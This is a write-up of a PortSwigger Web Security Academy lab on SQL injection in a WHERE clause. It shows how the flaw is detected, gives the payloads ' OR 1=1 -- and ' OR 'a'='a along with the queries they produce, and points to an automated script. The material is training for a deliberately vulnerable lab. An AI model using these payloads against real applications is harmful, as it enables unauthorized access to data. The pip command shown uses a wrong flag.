\+ Lab #1    : SQL injection in WHERE clause\
\+ Lab Level : Apprentice\
\+ Link      : https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data \


## About:
This lab contains a [SQL injection](https://portswigger.net/web-security/sql-injection) vulnerability in the product category filter.<br/> 
When the user selects a category, the application carries out a SQL query like the following: 
```SQL
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```
To solve the lab, perform a SQL injection attack that causes the application to display details of all products in any category, both released and unreleased. 

## Detection: 
* Submit a single quotation mark ```'``` in ```/filter?category=Gifts``` to break out the original SQL query quotation marks and cause an error
* The resulting query sent by the App to the back-end database:
```SQL
SELECT * FROM products WHERE category = 'Gifts'' AND released = 1
```
* The App returns a ```500 Internal Server Error``` response, which means that an error has occured in the back-end while processing the query.
* The ```category``` parameter is vulnerable to SQL injection.

## Exploitation:
### Manual:
1. Intercept the request with Burp Suite proxy
2. Send the request to repeater
3. Inject the ```category``` parameter with the following payload: ``` ' OR 1=1 --``` 
4. The resulting SQL query sent by the App to the backend database: 
```SQL
SELECT * FROM products WHERE category = '' OR 1=1 --' AND released = 1
SELECT * FROM products WHERE category = '' OR 1=1
```
> :memo: **Note:** The following payload ```' OR 'a'='a``` is also valid and achieves the same result as the 1=1 attack to return all products, regardless of whether they have been released.
```SQL
SELECT * FROM products WHERE category = '' OR 'a'='a' AND released = 1 
```

### Automated:
* Refer to https://github.com/YounesTasra-R4z3rSw0rd/Web-Security-Academy/blob/main/SQL%20Injection/Lab%231/Lab-1.py
* Requirements:
```bash
pip3 install -m requirements.txt
```
* Help Menu: 
```bash
$ python3 Lab-1.py --help
usage: Lab-1.py [-h] -u URL [-n]

Usage Example: python3 SQLi-Lab#1.py --url https://0a2100.web-security-academy.net/ --no-proxy

options:
  -h, --help         show this help message and exit
  -u URL, --url URL  Enter the Lab URL
  -n, --no-proxy     Do not use proxy                               
```
![Lab#1](https://user-images.githubusercontent.com/101610095/219432009-faf5cc9a-1828-47fc-8f9d-07eaa67ebb20.gif)
